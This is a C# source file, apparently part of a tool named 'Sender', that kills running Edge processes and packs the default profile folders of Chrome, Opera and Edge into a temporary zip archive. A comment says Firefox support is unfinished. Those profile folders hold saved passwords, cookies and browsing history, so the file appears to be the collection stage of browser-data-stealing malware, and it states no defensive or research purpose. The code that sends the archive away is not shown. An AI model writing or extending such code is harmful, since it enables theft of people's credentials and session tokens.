using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Sender
{
    internal class SenderBrowserData
    {
        public static string PackageBrowserData(CancellationToken cancellationToken)
        {
            string tempZipPath = Path.Combine(Path.GetTempPath(), "BrowserData.zip");

            if (File.Exists(tempZipPath)) File.Delete(tempZipPath);

            // Get paths to every browser default files.
            Dictionary<string, string> browserDefaultPaths = new()
            {
                {"Chrome", GetBrowserPath("Chrome")},
                {"Opera", GetBrowserPath("Opera")},
                {"Edge", GetBrowserPath("Edge")},
            };

            // i can check which browser directories exist and copy the files there.
            using var archive = ZipFile.Open(tempZipPath, ZipArchiveMode.Create);
            foreach (var browser in browserDefaultPaths)
            {
                // Make a temp dir for all the browsers files before packing it.

                // Make a method for killing processess.
                if (browser.Key == "Edge")
                {
                    Process[] edge = Process.GetProcessesByName("msedge");
                    foreach (var process in edge)
                    {
                        process.Kill();
                    }

                    Thread.Sleep(1000);
                }

                // Package the default directory of all the browsers
                string browserFilesPath = browser.Value;
                if (Directory.Exists(browserFilesPath))
                {
                    SenderUserFiles.AddDirectoryToZip(archive, browserFilesPath, browser.Key, cancellationToken);
                }
            }

            return tempZipPath;
        }

        private static string GetBrowserPath(string browser)
        {
            return browser switch
            {
                "Chrome" => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome", "User Data", "Default"),
                "Opera" => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera Software", "Opera Stable", "Default"),
                "Edge" => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Edge", "User Data", "Default"),
                // Firefox ei vielä toimi
                //"Firefox" => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla", "Firefox", "Profiles"),
                _ => throw new InvalidOperationException("Unknown browser")
            };
        }
    }
}
